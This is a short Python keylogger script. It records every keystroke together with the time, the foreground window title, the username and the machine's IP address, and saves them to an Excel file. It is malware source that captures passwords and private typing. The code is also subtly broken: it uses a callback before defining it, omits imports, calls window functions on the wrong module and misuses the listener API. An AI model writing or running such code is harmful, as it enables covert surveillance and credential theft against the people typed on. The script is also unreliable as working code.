import pynput
import openpyxl
import psutil
import win32api

# create a new Excel workbook
workbook = openpyxl.Workbook()
# create a new sheet
worksheet = workbook.active
# set the column widths
worksheet.column_dimensions['A'].width = 20
worksheet.column_dimensions['B'].width = 20
worksheet.column_dimensions['C'].width = 50
worksheet.column_dimensions['D'].width = 20
worksheet.column_dimensions['E'].width = 20

# create a keyboard listener
keyboard_listener = pynput.keyboard.Listener(on_press=on_press)

def on_press(key):
    # get the current time
    time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # get the key name as a string
    key_str = str(key).replace("'", "")
    # get the process name and window title
    process = psutil.Process()
    window = win32api.GetWindowText(win32api.GetForegroundWindow())
    # get the username
    username = os.getlogin()
    # get the machine IP address
    ip_address = socket.gethostbyname(socket.gethostname())
    # write the time, key, process, window, username, and IP address to the worksheet
    worksheet.append([time, key_str, process, window, username, ip_address])
    # save the workbook
    workbook.save("keylogs.xlsx")

# start the keyboard listener
keyboard_listener.start()

# keep the program running until the user presses the Esc key
with pynput.keyboard.Listener(on_release=lambda key: key == pynput.keyboard.Key.esc):
    pynput.keyboard.Listener.join()